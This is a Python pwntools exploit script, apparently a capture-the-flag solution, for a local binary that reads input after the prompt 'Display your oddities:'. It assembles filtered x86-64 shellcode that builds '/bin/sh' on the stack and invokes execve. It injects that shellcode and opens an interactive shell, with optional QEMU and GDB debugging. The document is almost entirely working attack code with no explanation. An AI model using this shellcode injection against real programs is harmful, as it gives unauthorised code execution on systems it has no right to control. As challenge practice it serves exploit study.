from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
break *$rebase(0x1326)
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


def build_odd_shellcode():
    shell = asm("""

       /* push 0x68 */
       xor r15,r15
       mov r15b, 0x35
       add r15, 0x33
       push r15

       /* push 0x732f2f2f6e69622f */
       xor r15, r15
       mov r15,(0x732f2f2f6e69622f-0x03060306)
       add r15, (0x03060306)/2
       add r15, (0x03060306)/2
       push r15

       /* rdi = rsp */
       xchg r9, rsp
       xchg r9, rdi

       /* rsi = 0x0 */
       xor r13, r13
       xchg r13, rsi

       /* rdx = 0x0 */
       xor r13, r13
       xchg r13, rdx
       /* rax = 0x3b */
       mov r9b, 0x3b
       xchg r9, rax

       /* execve(rdi="/bin/sh",rsi=0x0,rdx=0x0) */
       syscall
    """)
    return shell

shell = build_odd_shellcode()

log.info("Shellcode: ")
print(disasm(shell))

p = start()
p.recvline(b'Display your oddities:')
p.sendline(shell)
p.interactive()
